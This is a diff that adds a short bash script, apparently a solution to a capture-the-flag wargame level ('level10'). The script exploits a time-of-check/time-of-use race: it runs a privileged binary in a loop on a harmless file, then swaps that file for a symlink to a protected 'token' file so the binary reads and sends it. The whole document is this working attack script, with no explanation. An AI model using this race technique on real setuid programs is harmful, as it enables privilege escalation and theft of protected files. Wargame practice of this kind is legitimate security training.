@@ -1,0 +1,20 @@
+#! /bin/bash
+
+declare -r file="infect"
+declare -r target="./token"
+declare -r TARGET_ERROR="32"
+
+execute() {
+    ./level10 "$1" 127.0.0.1
+    ret=$?
+    if [ "$ret" != "$TARGET_ERROR" ];then
+        execute "$1"
+    fi
+}
+
+rm -rf "$file"
+echo "bonjour" > "$file"
+execute "$file" &
+sleep 0.3
+ln -sf "$target" "$file"
+wait $(jobs -p | sed -n '1p')
